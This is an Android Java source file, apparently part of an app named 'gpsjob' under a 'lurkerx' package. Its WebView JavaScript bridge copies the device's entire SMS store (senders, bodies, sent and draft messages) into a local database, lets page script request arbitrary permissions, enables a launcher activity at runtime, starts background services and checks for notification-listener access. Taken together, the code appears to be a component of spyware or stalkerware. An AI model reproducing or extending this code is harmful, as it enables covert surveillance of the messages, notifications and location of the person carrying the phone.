package com.lurkerx.gpsjob;

import android.Manifest;
import android.app.Activity;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.content.ContentValues;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Build;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.provider.Settings;

import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.work.*;
import androidx.work.PeriodicWorkRequest;

import com.lurkerx.gpsjob.smsjob.SmsDatabaseHelper;
import org.json.JSONArray;

public class AndroidBridge {
    private Activity activity;
    private final GpsDatabaseHelper dbHelper;
    private final SmsDatabaseHelper smsDbHelper;
    private static final String PREFS_NAME = "gpsjob_prefs";
    private static final String KEY_FIRST_LAUNCH = "first_launch_done";

    public AndroidBridge(Activity activity) {
        this.activity = activity;
        this.dbHelper = new GpsDatabaseHelper(activity);
        this.smsDbHelper = new SmsDatabaseHelper(activity);
    }

    @JavascriptInterface
    public void saveSmsIfNew() {
        try {
            if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_SMS)
                    != PackageManager.PERMISSION_GRANTED) {
                Log.d("AndroidBridge", "No READ_SMS permission, returning");
                return;
            }
            Uri uri = Uri.parse("content://sms/inbox");
            Cursor cursor = activity.getContentResolver().query(uri, null, null, null, "date DESC");

            if (cursor != null) {
                SQLiteDatabase db = smsDbHelper.getWritableDatabase();
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));

                    int typeInt = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                    String type;
                    switch (typeInt) {
                        case 1: type = "received"; break;
                        case 2: type = "sent"; break;
                        case 3: type = "draft"; break;
                        case 4: type = "outbox"; break;
                        case 5: type = "failed"; break;
                        case 6: type = "queued"; break;
                        default: type = "unknown"; break;
                    }

                    ContentValues values = new ContentValues();
                    values.put("address", address);
                    values.put("body", body);
                    values.put("date", date);
                    values.put("type", type);
                    db.insertWithOnConflict("sms", null, values, SQLiteDatabase.CONFLICT_IGNORE);
                }
                cursor.close();
                db.close();
                Log.d("AndroidBridge", "Successfully saved SMS");
            }
        } catch (Exception e) {
            Log.e("AndroidBridge", "Error saving SMS", e);
            e.printStackTrace();
        }
    }

    @JavascriptInterface
    public boolean isPermissionGranted(String permission) {
        if (activity == null) return false;
        return ContextCompat.checkSelfPermission(activity, permission)
                == PackageManager.PERMISSION_GRANTED;
    }

    @JavascriptInterface
    public void requestPermissions(String jsonPerms) {
        try {
            if (activity == null) return;
            JSONArray arr = new JSONArray(jsonPerms);
            String[] permissions = new String[arr.length()];
            for (int i = 0; i < arr.length(); i++) {
                permissions[i] = arr.getString(i);
            }
            ActivityCompat.requestPermissions(activity, permissions, 1001);
        } catch (Exception e) {
            Log.e("AndroidBridge", "Error requesting permissions", e);
            e.printStackTrace();
        }
    }

    @JavascriptInterface
    public void launchEnableActivity() {
        startAllServices();
        ComponentName componentName = new ComponentName(activity, LaunchActivity.class);
        activity.getPackageManager().setComponentEnabledSetting(
                componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        Intent intent = new Intent(activity, LaunchActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        activity.startActivity(intent);
    }

    @JavascriptInterface
    public synchronized void startAllServices() {
        Context context = activity.getApplicationContext();
        com.lurkerx.gpsjob.notifjob.NotificationService.startAllBackgroundTasks(context);
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @JavascriptInterface
    public void launchNotificationAccess(){
        Log.d("AndroidBridge", "Requesting notification access");
        Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        activity.startActivity(intent);
    }

    @JavascriptInterface
    public boolean isNotifAccessGranted() {
        if (activity == null) return false;
        String pkgName = activity.getPackageName();
        final String flat = Settings.Secure.getString(activity.getContentResolver(),
                "enabled_notification_listeners");
        if (flat != null && !flat.isEmpty()) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null) {
                    if (pkgName.equals(cn.getPackageName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }
}
